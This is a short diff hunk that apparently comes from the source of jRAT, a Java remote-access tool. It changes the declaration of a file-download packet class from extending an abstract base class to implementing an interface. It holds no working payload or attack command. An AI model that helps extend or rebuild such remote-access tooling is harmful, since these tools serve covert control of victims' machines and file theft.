@@ -8,7 +8,7 @@ import jrat.common.io.TransferData;
 import java.io.File;
 
 
-public class Packet42ClientDownloadFile extends AbstractIncomingPacket {
+public class Packet42ClientDownloadFile implements IncomingPacket {
 
 	@Override
 	public void read(Connection con) throws Exception {
